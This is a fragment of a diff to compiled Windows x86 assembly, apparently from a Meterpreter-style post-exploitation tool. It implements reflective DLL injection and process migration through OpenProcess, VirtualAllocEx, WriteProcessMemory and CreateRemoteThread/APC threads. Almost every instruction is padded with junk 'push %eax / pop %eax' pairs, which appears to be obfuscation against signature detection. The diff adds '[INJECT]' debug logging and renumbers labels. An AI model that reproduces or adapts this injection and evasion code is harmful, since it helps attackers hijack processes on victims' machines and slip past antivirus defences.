+pop %eax
+	movl	$LC28, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L45
+push %eax
+pop %eax
+L49:
 	movl	-40(%ebp), %eax
 push %eax
 pop %eax
@@ -1664,7 +2378,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L48
+	jne	L50
 push %eax
 pop %eax
 	movl	$6, (%esp)
@@ -1688,10 +2402,31 @@ pop %eax
 	movl	%eax, -28(%ebp)
 push %eax
 pop %eax
-	jmp	L43
+	movl	-28(%ebp), %eax
 push %eax
 pop %eax
-L48:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-28(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC29, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L45
+push %eax
+pop %eax
+L50:
 	movl	-40(%ebp), %eax
 push %eax
 pop %eax
@@ -1704,11 +2439,26 @@ pop %eax
 	movl	%edx, (%eax)
 push %eax
 pop %eax
-L43:
+	movl	-40(%ebp), %eax
+push %eax
+pop %eax
+	movl	24(%eax), %eax
+push %eax
+pop %eax
+	movl	%eax, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC30, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+L45:
 	cmpl	$0, -32(%ebp)
 push %eax
 pop %eax
-	je	L49
+	je	L51
 push %eax
 pop %eax
 	movl	$16384, 8(%esp)
@@ -1732,11 +2482,11 @@ pop %eax
 	subl	$12, %esp
 push %eax
 pop %eax
-L49:
+L51:
 	cmpl	$0, -36(%ebp)
 push %eax
 pop %eax
-	je	L50
+	je	L52
 push %eax
 pop %eax
 	movl	$16384, 8(%esp)
@@ -1760,7 +2510,7 @@ pop %eax
 	subl	$12, %esp
 push %eax
 pop %eax
-L50:
+L52:
 	movl	-28(%ebp), %eax
 push %eax
 pop %eax
@@ -1782,6 +2532,29 @@ pop %eax
 	ret
 push %eax
 pop %eax
+	.section .rdata,"dr"
+	.align 4
+LC31:
+	.ascii "[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed\0"
+	.align 4
+LC32:
+	.ascii "[INJECT] inject_via_remotethread: CreateRemoteThread failed\0"
+	.align 4
+LC33:
+	.ascii "[INJECT] inject_via_remotethread: succeeded\0"
+	.align 4
+LC34:
+	.ascii "[INJECT] inject_via_remotethread: Sending a migrate response...\0"
+	.align 4
+LC35:
+	.ascii "[INJECT] inject_via_remotethread: Sleeping for two seconds...\0"
+	.align 4
+LC36:
+	.ascii "[INJECT] inject_via_remotethread: Resuming the injected thread...\0"
+	.align 4
+LC37:
+	.ascii "[INJECT] inject_via_remotethread: ResumeThread failed\0"
+	.text
 	.globl	_inject_via_remotethread
 	.def	_inject_via_remotethread;	.scl	2;	.type	32;	.endef
 _inject_via_remotethread:
@@ -1842,13 +2615,13 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L53
+	jne	L55
 push %eax
 pop %eax
 	cmpl	$2, 20(%ebp)
 push %eax
 pop %eax
-	jne	L54
+	jne	L56
 push %eax
 pop %eax
 	movl	$1, -16(%ebp)
@@ -1884,7 +2657,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	je	L53
+	je	L57
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -1896,10 +2669,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L55
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L54:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC31, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L58
+push %eax
+pop %eax
+L56:
 	movl	__imp__GetLastError@0, %eax
 push %eax
 pop %eax
@@ -1909,20 +2703,54 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L55
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L53:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC32, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L58
+push %eax
+pop %eax
+L55:
+	movl	$LC33, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+L57:
 	cmpl	$0, 8(%ebp)
 push %eax
 pop %eax
-	je	L56
+	je	L59
 push %eax
 pop %eax
 	cmpl	$0, 12(%ebp)
 push %eax
 pop %eax
-	je	L56
+	je	L59
+push %eax
+pop %eax
+	movl	$LC34, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
 push %eax
 pop %eax
 	movl	-16(%ebp), %eax
@@ -1961,6 +2789,12 @@ pop %eax
 	call	_packet_transmit_response
 push %eax
 pop %eax
+	movl	$LC35, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
 	movl	$2000, (%esp)
 push %eax
 pop %eax
@@ -1973,7 +2807,13 @@ pop %eax
 	subl	$4, %esp
 push %eax
 pop %eax
-L56:
+L59:
+	movl	$LC36, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
 	movl	-20(%ebp), %eax
 push %eax
 pop %eax
@@ -1992,7 +2832,7 @@ pop %eax
 	cmpl	$-1, %eax
 push %eax
 pop %eax
-	jne	L55
+	jne	L58
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -2004,17 +2844,38 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC37, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
 	nop
 push %eax
 pop %eax
-L55:
+L58:
 	movl	-20(%ebp), %eax
 push %eax
 pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	je	L57
+	je	L60
 push %eax
 pop %eax
 	movl	-20(%ebp), %eax
@@ -2032,7 +2893,7 @@ pop %eax
 	subl	$4, %esp
 push %eax
 pop %eax
-L57:
+L60:
 	movl	-12(%ebp), %eax
 push %eax
 pop %eax
@@ -2057,6 +2918,35 @@ pop %eax
 	ret
 push %eax
 pop %eax
+	.section .rdata,"dr"
+	.align 4
+LC38:
+	.ascii "[INJECT] inject_dll.  No Dll buffer supplied.\0"
+	.align 4
+LC39:
+	.ascii "[INJECT] inject_dll. GetReflectiveLoaderOffset failed.\0"
+	.align 4
+LC40:
+	.ascii "[INJECT] inject_dll. OpenProcess failed.\0"
+	.align 4
+LC41:
+	.ascii "[INJECT] inject_dll. VirtualAllocEx 1 failed\0"
+	.align 4
+LC42:
+	.ascii "[INJECT] inject_dll. WriteProcessMemory 1 failed\0"
+	.align 4
+LC43:
+	.ascii "[INJECT] inject_dll. VirtualAllocEx 2 failed\0"
+	.align 4
+LC44:
+	.ascii "[INJECT] inject_dll. WriteProcessMemory 2 failed\0"
+	.align 4
+LC45:
+	.ascii "[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread...\0"
+	.align 4
+LC46:
+	.ascii "[INJECT] inject_dll. inject_via_apcthread failed\0"
+	.text
 	.globl	_inject_dll
 	.def	_inject_dll;	.scl	2;	.type	32;	.endef
 _inject_dll:
@@ -2093,23 +2983,44 @@ pop %eax
 	cmpl	$0, 12(%ebp)
 push %eax
 pop %eax
-	je	L60
+	je	L63
 push %eax
 pop %eax
 	cmpl	$0, 16(%ebp)
 push %eax
 pop %eax
-	jne	L61
+	jne	L64
 push %eax
 pop %eax
-L60:
+L63:
 	movl	$87, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L62
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L61:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC38, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L65
+push %eax
+pop %eax
+L64:
 	movl	20(%ebp), %eax
 push %eax
 pop %eax
@@ -2131,16 +3042,37 @@ pop %eax
 	cmpl	$0, -36(%ebp)
 push %eax
 pop %eax
-	jne	L63
+	jne	L66
 push %eax
 pop %eax
 	movl	$1, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L62
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L63:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC39, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L65
+push %eax
+pop %eax
+L66:
 	movl	8(%ebp), %eax
 push %eax
 pop %eax
@@ -2168,7 +3100,7 @@ pop %eax
 	cmpl	$0, -20(%ebp)
 push %eax
 pop %eax
-	jne	L64
+	jne	L67
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -2180,14 +3112,35 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L62
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L64:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC40, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L65
+push %eax
+pop %eax
+L67:
 	cmpl	$0, 24(%ebp)
 push %eax
 pop %eax
-	je	L65
+	je	L68
 push %eax
 pop %eax
 	movl	24(%ebp), %eax
@@ -2235,7 +3188,7 @@ pop %eax
 	cmpl	$0, -16(%ebp)
 push %eax
 pop %eax
-	jne	L66
+	jne	L69
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -2247,10 +3200,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L62
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L66:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC41, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L65
+push %eax
+pop %eax
+L69:
 	movl	24(%ebp), %eax
 push %eax
 pop %eax
@@ -2299,7 +3273,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L65
+	jne	L68
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -2311,10 +3285,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L62
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L65:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC42, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L65
+push %eax
+pop %eax
+L68:
 	movl	$64, 16(%esp)
 push %eax
 pop %eax
@@ -2351,7 +3346,7 @@ pop %eax
 	cmpl	$0, -28(%ebp)
 push %eax
 pop %eax
-	jne	L67
+	jne	L70
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -2363,10 +3358,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L62
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L67:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC43, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L65
+push %eax
+pop %eax
+L70:
 	movl	$0, 16(%esp)
 push %eax
 pop %eax
@@ -2406,7 +3422,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L68
+	jne	L71
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -2418,10 +3434,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L62
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L68:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC44, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L65
+push %eax
+pop %eax
+L71:
 	movl	-28(%ebp), %edx
 push %eax
 pop %eax
@@ -2467,7 +3504,13 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	je	L69
+	je	L72
+push %eax
+pop %eax
+	movl	$LC45, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
 push %eax
 pop %eax
 	movl	-16(%ebp), %eax
@@ -2509,7 +3552,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	je	L69
+	je	L72
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -2521,18 +3564,39 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L62
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L69:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC46, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L65
+push %eax
+pop %eax
+L72:
 	movl	$0, -12(%ebp)
 push %eax
 pop %eax
-L62:
+L65:
 	cmpl	$0, -20(%ebp)
 push %eax
 pop %eax
-	je	L70
+	je	L73
 push %eax
 pop %eax
 	movl	-20(%ebp), %eax
@@ -2550,7 +3614,7 @@ pop %eax
 	subl	$4, %esp
 push %eax
 pop %eax
-L70:
+L73:
 	movl	-12(%ebp), %eax
 push %eax
 pop %eax
@@ -2561,6 +3625,8 @@ pop %eax
 push %eax
 pop %eax
 	.ident	"GCC: (GNU) 9.3-win32 20200320"
+	.def	_strlen;	.scl	2;	.type	32;	.endef
+	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
 	.def	_list_create;	.scl	2;	.type	32;	.endef
 	.def	_malloc;	.scl	2;	.type	32;	.endef
 	.def	_memset;	.scl	2;	.type	32;	.endef
@@ -2575,4 +3641,3 @@ pop %eax
 	.def	_list_destroy;	.scl	2;	.type	32;	.endef
 	.def	_create_remote_thread;	.scl	2;	.type	32;	.endef
 	.def	_GetReflectiveLoaderOffset;	.scl	2;	.type	32;	.endef
-	.def	_strlen;	.scl	2;	.type	32;	.endef
